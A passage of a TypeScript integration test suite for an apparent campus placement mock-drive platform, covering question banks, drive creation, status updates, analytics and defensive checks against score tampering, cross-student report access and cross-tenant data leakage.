    it('should list and create institutional question banks', async () => {
      // List existing banks
      const listRes = await request(app)
        .get('/api/v1/tpo/mock-drives/question-banks')
        .set('Authorization', `Bearer ${tokenTpoA}`);

      expect(listRes.status).toBe(200);
      expect(listRes.body.success).toBe(true);
      expect(listRes.body.questionBanks.length).toBeGreaterThan(0);

      // Create new bank
      const createRes = await request(app)
        .post('/api/v1/tpo/mock-drives/question-banks')
        .set('Authorization', `Bearer ${tokenTpoA}`)
        .send({
          title: 'Department of CS Algorithmic Mastery Bank',
          description: 'Advanced dynamic programming & tree challenges',
          roundType: 'CODING',
          category: 'Data Structures and Algorithms'
        });

      expect(createRes.status).toBe(201);
      expect(createRes.body.success).toBe(true);
      expect(createRes.body.questionBank.title).toBe('Department of CS Algorithmic Mastery Bank');
      expect(createRes.body.questionBank.tenantId).toBe(TENANT_A);
    });

    it('should create and configure a new multi-round mock drive', async () => {
      const createDriveRes = await request(app)
        .post('/api/v1/tpo/mock-drives')
        .set('Authorization', `Bearer ${tokenTpoA}`)
        .send({
          title: 'Campus Placement Readiness Simulation 2026',
          description: '3-stage mock drive with aptitude, coding, and role-based technical interview',
          companyName: 'Institutional Placement Cell',
          targetRoles: ['Software Engineer', 'Backend Developer'],
          startDate: '2026-11-20T09:00:00Z',
          endDate: '2026-12-05T18:00:00Z',
          rounds: [
            {
              id: 'r1',
              roundNumber: 1,
              roundType: 'APTITUDE',
              title: 'Quantitative & Logical Aptitude',
              durationMinutes: 30,
              passingScorePercentage: 60,
              totalMarks: 100
            },
            {
              id: 'r2',
              roundNumber: 2,
              roundType: 'CODING',
              title: 'Algorithmic Problem Solving',
              durationMinutes: 60,
              passingScorePercentage: 70,
              totalMarks: 100
            },
            {
              id: 'r3',
              roundNumber: 3,
              roundType: 'INTERVIEW',
              title: 'System Design & Technical Interview',
              durationMinutes: 45,
              passingScorePercentage: 75,
              totalMarks: 100
            }
          ]
        });

      expect(createDriveRes.status).toBe(201);
      expect(createDriveRes.body.success).toBe(true);
      const drive = createDriveRes.body.mockDrive;
      expect(drive.id).toBeDefined();
      expect(drive.title).toBe('Campus Placement Readiness Simulation 2026');
      expect(drive.rounds).toHaveLength(3);
    });

    it('should update mock drive status (e.g. UPCOMING -> ACTIVE)', async () => {
      const drive = mockDriveService.getMockDrive('mock-drive-standard-01');
      expect(drive).toBeDefined();

      const updateRes = await request(app)
        .patch(`/api/v1/tpo/mock-drives/${drive!.id}`)
        .set('Authorization', `Bearer ${tokenTpoA}`)
        .send({
          status: 'ACTIVE'
        });

      expect(updateRes.status).toBe(200);
      expect(updateRes.body.success).toBe(true);
      expect(updateRes.body.mockDrive.status).toBe('ACTIVE');
    });

    it('should retrieve institutional cohort analytics with pass rates', async () => {
      const analyticsRes = await request(app)
        .get('/api/v1/tpo/mock-drives/mock-drive-standard-01/analytics')
        .set('Authorization', `Bearer ${tokenTpoA}`);

      expect(analyticsRes.status).toBe(200);
      expect(analyticsRes.body.success).toBe(true);
      const analytics = analyticsRes.body.analytics;
      expect(analytics.driveId).toBe('mock-drive-standard-01');
      expect(analytics.totalRegistered).toBeGreaterThan(0);
      expect(analytics.roundAnalytics).toHaveLength(3);
      expect(analytics.averageScore).toBeGreaterThan(0);
    });
  });

  // =========================================================================
  // 11. Anti-Tampering, Cross-Tenant Isolation & Security Boundaries
  // =========================================================================
  describe('11. Anti-Tampering, Cross-Tenant Isolation & Object-Level Security Boundaries', () => {
    it('should prevent students from directly tampering with their scores (no client-controlled scoring endpoint)', async () => {
      // In CarrerSync, there is no PUT/PATCH /reports endpoint or any endpoint that accepts raw scores.
      // Attempting to send score modifications in submit/save is ignored because the server computes all values.
      const startRes = await request(app)
        .post('/api/v1/student/assessments/aptitude/start')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ durationMinutes: 10, questionCount: 1 });

      const attemptId = startRes.body.attempt.id;

      // Attacker tries to inject { score: 100, passed: true }
      const submitRes = await request(app)
        .post(`/api/v1/student/assessments/aptitude/${attemptId}/submit`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          answers: {},
          score: 100,
          percentage: 100,
          passed: true
        });

      expect(submitRes.status).toBe(200);
      // Server must calculate score based on verified answers (which is 0 here since empty), ignoring injected fields
      expect(submitRes.body.score).toBe(0);
      expect(submitRes.body.percentage).toBe(0);
    });

    it('should prevent Student A2 from accessing Student A1\'s performance report (404/Forbidden boundary)', async () => {
      // Get Student A1's report
      const repListA1 = await request(app)
        .get('/api/v1/student/mock-drives/reports')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      const reportIdA1 = repListA1.body.reports[0].id;

      // Student A2 attempts to fetch Student A1's report
      const attackRes = await request(app)
        .get(`/api/v1/student/mock-drives/reports/${reportIdA1}`)
        .set('Authorization', `Bearer ${tokenStudentA2}`);

      // Expect 404 (not found under Student A2's ownership)
      expect(attackRes.status).toBe(404);
      expect(attackRes.body.success).toBe(false);
    });

    it('should prevent Tenant B student from accessing Tenant A private mock drives and data', async () => {
      // Create a private drive in Tenant A
      const privateDriveA = mockDriveService.createMockDrive({
        tenantId: TENANT_A,
        title: 'Tenant A Exclusive Engineering Drive',
        description: 'Internal private mock drive for College A',
        companyName: 'College A Enterprise',
        targetRoles: ['Software Engineer'],
        startDate: '2026-11-20T00:00:00Z',
        endDate: '2026-12-01T00:00:00Z',
        rounds: [],
        createdBy: tpoAdminA.id
      });

      // Tenant B student lists drives
      const resB = await request(app)
        .get('/api/v1/student/mock-drives')
        .set('Authorization', `Bearer ${tokenStudentB}`);

      expect(resB.status).toBe(200);
      const visibleDriveIds = resB.body.drives.map((d: any) => d.id);
      expect(visibleDriveIds).not.toContain(privateDriveA.id);
    });

    it('should isolate question banks by tenant (Tenant B TPO cannot see Tenant A private question banks)', async () => {
      // Create private question bank in Tenant A
      const privateBankA = mockDriveService.createQuestionBank({
        tenantId: TENANT_A,
        title: 'Tenant A Proprietary Coding Bank',
        description: 'Confidential algorithmic test bank for College A',
        roundType: 'CODING',
        category: 'Algorithms',
        createdBy: tpoAdminA.id
      });

      // Tenant B TPO queries question banks
      const banksResB = await request(app)
        .get('/api/v1/tpo/mock-drives/question-banks')
        .set('Authorization', `Bearer ${tokenTpoB}`);

      expect(banksResB.status).toBe(200);
      const bankIds = banksResB.body.questionBanks.map((b: any) => b.id);
      expect(bankIds).not.toContain(privateBankA.id);
    });
  });
});
